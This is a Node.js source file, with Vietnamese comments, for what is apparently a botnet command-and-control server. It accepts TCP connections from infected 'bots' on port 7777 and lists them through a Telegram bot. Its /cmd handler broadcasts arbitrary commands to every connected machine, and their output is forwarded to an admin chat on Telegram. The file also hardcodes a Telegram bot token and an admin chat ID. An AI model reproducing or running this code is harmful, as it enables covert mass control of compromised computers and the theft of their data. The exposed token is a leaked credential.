const net = require('net');
const TelegramBot = require('node-telegram-bot-api');

const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
const chatIdAdmin = 7371969470;

const bot = new TelegramBot(token, { polling: true });

const danh_sach_khach = new Map(); // key = socket, value = { ip, port }

const server = net.createServer((socket) => {
  const ip = socket.remoteAddress;
  const port = socket.remotePort;
  const key = socket;

  danh_sach_khach.set(key, { ip, port });

  bot.sendMessage(chatIdAdmin, `[+] Bot mới kết nối: ${ip}:${port}`);

  socket.on('data', (data) => {
    const msg = data.toString().trim();
    if (msg.length > 0) {
      console.log(`[${ip}:${port}] Kết quả:\n${msg}`);
      // Gửi kết quả lên Telegram kèm IP:PORT
      bot.sendMessage(chatIdAdmin, `📡 [${ip}:${port}] Kết quả:\n${msg}`);
    }
  });

  socket.on('close', () => {
    danh_sach_khach.delete(key);
    bot.sendMessage(chatIdAdmin, `[-] Bot mất kết nối: ${ip}:${port}`);
  });

  socket.on('error', () => {
    danh_sach_khach.delete(key);
    bot.sendMessage(chatIdAdmin, `[-] Bot lỗi kết nối, đã xóa: ${ip}:${port}`);
  });
});

server.listen(7777, '0.0.0.0', () => {
  console.log('[*] Server đang lắng nghe trên cổng 7777');
});

bot.onText(/^\/listbot$/, (msg) => {
  if (msg.chat.id !== chatIdAdmin) return;
  const count = danh_sach_khach.size;
  let text = `🤖 Có tổng cộng ${count} bot đang kết nối:\n`;
  let i = 1;
  for (const { ip, port } of danh_sach_khach.values()) {
    text += `Bot ${i} - [${ip}:${port}]\n`;
    i++;
  }
  bot.sendMessage(chatIdAdmin, text);
});

bot.onText(/^\/cmd (.+)$/, (msg, match) => {
  if (msg.chat.id !== chatIdAdmin) return;
  const lenh = match[1].trim();
  if (!lenh) {
    bot.sendMessage(chatIdAdmin, 'Vui lòng nhập lệnh sau /cmd');
    return;
  }
  if (danh_sach_khach.size === 0) {
    bot.sendMessage(chatIdAdmin, 'Hiện không có bot nào kết nối.');
    return;
  }
  for (const socket of danh_sach_khach.keys()) {
    try {
      socket.write(lenh + '\n');
    } catch {}
  }
  bot.sendMessage(chatIdAdmin, `Đã gửi lệnh cho ${danh_sach_khach.size} bot:\n${lenh}`);
});
